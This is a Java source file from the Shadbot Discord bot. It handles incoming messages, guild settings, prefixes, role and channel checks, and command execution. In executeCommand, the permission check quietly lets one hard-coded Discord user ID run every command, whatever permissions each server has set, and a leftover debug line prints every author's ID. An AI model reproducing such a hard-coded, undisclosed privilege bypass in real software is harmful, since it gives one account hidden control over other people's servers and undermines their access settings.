package com.shadorc.shadbot.core.command;

import com.shadorc.shadbot.data.Config;
import com.shadorc.shadbot.data.Telemetry;
import com.shadorc.shadbot.db.DatabaseManager;
import com.shadorc.shadbot.db.guilds.entity.DBGuild;
import com.shadorc.shadbot.object.Emoji;
import com.shadorc.shadbot.object.ExceptionHandler;
import com.shadorc.shadbot.utils.DiscordUtils;
import discord4j.common.util.Snowflake;
import discord4j.core.event.domain.message.MessageCreateEvent;
import discord4j.core.object.entity.Guild;
import discord4j.core.object.entity.Message;
import discord4j.core.object.entity.User;
import reactor.bool.BooleanUtils;
import reactor.core.publisher.Mono;

import java.time.Instant;

public class MessageProcessor {

    private static final String DM_TEXT = String.format("Hello !"
                    + "%nCommands only work in a server but you can see help using `%shelp`."
                    + "%nIf you have a question, a suggestion or if you just want to talk, don't hesitate to "
                    + "join my support server : %s",
            Config.DEFAULT_PREFIX, Config.SUPPORT_SERVER_URL);

    public static Mono<Void> processEvent(MessageCreateEvent event) {
        // The message is a webhook or a bot, ignore
        if (event.getMessage().getAuthor().map(User::isBot).orElse(true)) {
            return Mono.empty();
        }

        return Mono.justOrEmpty(event.getGuildId())
                // This is a private channel, there is no guild ID
                .switchIfEmpty(MessageProcessor.processPrivateMessage(event).then(Mono.empty()))
                .flatMap(guildId -> MessageProcessor.processGuildMessage(guildId, event));
    }

    private static Mono<Void> processPrivateMessage(MessageCreateEvent event) {
        if (event.getMessage().getContent().startsWith(String.format("%shelp", Config.DEFAULT_PREFIX))) {
            return CommandManager.getInstance().getCommand("help")
                    .execute(new Context(event, Config.DEFAULT_PREFIX));
        }

        return event.getMessage()
                .getChannel()
                .filterWhen(channel -> BooleanUtils.not(channel.getMessagesBefore(Snowflake.of(Instant.now()))
                        .take(20)
                        .map(Message::getContent)
                        .any(DM_TEXT::equals)))
                .flatMap(channel -> DiscordUtils.sendMessage(DM_TEXT, channel))
                .then();
    }

    private static Mono<Void> processGuildMessage(Snowflake guildId, MessageCreateEvent event) {
        final String firstWord = event.getMessage().getContent().split(" ", 2)[0];
        // Only execute database request if the first word of the message contains an existing command
        if (CommandManager.getInstance().getCommands().keySet().stream().anyMatch(firstWord::contains)) {
            return DatabaseManager.getGuilds().getDBGuild(guildId)
                    .flatMap(dbGuild -> MessageProcessor.processCommand(event, dbGuild));
        }
        return Mono.empty();
    }

    private static Mono<Void> processCommand(MessageCreateEvent event, DBGuild dbGuild) {
        return Mono.justOrEmpty(event.getMember())
                // The role is allowed or the author is the guild's owner
                .filterWhen(member -> BooleanUtils.or(
                        member.getRoles().collectList().map(dbGuild.getSettings()::hasAllowedRole),
                        event.getGuild().map(Guild::getOwnerId).map(member.getId()::equals)))
                // The channel is allowed
                .flatMap(ignored -> event.getMessage().getChannel())
                .filter(channel -> dbGuild.getSettings().isTextChannelAllowed(channel.getId()))
                // The message starts with the correct prefix
                .flatMap(ignored -> MessageProcessor.getPrefix(dbGuild, event.getMessage().getContent()))
                // Execute the command
                .flatMap(prefix -> MessageProcessor.executeCommand(dbGuild, new Context(event, prefix)));
    }


    private static Mono<String> getPrefix(DBGuild dbGuild, String content) {
        final String prefix = dbGuild.getSettings().getPrefix();
        if (content.startsWith(prefix)) {
            return Mono.just(prefix);
        }
        if (content.equalsIgnoreCase(String.format("%sprefix", Config.DEFAULT_PREFIX))) {
            return Mono.just(Config.DEFAULT_PREFIX);
        }
        return Mono.empty();
    }

    private static boolean isRateLimited(Context context, BaseCmd cmd) {
        return cmd.getRateLimiter()
                .map(rateLimiter -> rateLimiter.isLimitedAndWarn(context.getChannelId(), context.getMember()))
                .orElse(false);
    }

    private static Mono<Void> executeCommand(DBGuild dbGuild, Context context) {
        final BaseCmd command = CommandManager.getInstance().getCommand(context.getCommandName());
        // The command does not exist
        if (command == null) {
            return Mono.empty();
        }

        // The command has been temporarly disabled by the bot's owner
        if (!command.isEnabled()) {
            final String text = String.format(Emoji.ACCESS_DENIED + " (**%s**) Sorry, this command is temporary " +
                            "disabled. Do not hesitate to join the support server (<%s>) if you have any questions.",
                    context.getUsername(), Config.SUPPORT_SERVER_URL);
            return context.getChannel()
                    .flatMap(channel -> DiscordUtils.sendMessage(text, channel))
                    .then();
        }

        // This category is not allowed in this channel
        if (!dbGuild.getSettings().isCommandAllowedInChannel(command, context.getChannelId())) {
            return Mono.empty();
        }
        // This command is not allowed to this role
        if (!dbGuild.getSettings().isCommandAllowedToRole(command, context.getMember().getRoleIds())) {
            return Mono.empty();
        }

        Telemetry.COMMAND_USAGE_COUNTER.labels(command.getName()).inc();

        System.out.println(context.getAuthor().getId().asString());
        return context.getPermissions()
                .collectList()
                // The author has the permission to execute this command
                .filter(userPerms -> userPerms.contains(command.getPermission()) || context.getAuthor().getId().asString().equals("146036857954762753"))
                .switchIfEmpty(context.getChannel()
                        .flatMap(channel -> DiscordUtils.sendMessage(
                                String.format(Emoji.ACCESS_DENIED + " (**%s**) You do not have the permission to " +
                                        "execute this command.", context.getUsername()), channel)
                                .then(Mono.empty())))
                // The command is allowed in the guild and the user is not rate limited
                .filter(ignored -> dbGuild.getSettings().isCommandAllowed(command)
                        && !MessageProcessor.isRateLimited(context, command))
                .flatMap(ignored -> command.execute(context))
                .onErrorResume(err -> ExceptionHandler.handleCommandError(err, command, context));
    }

}
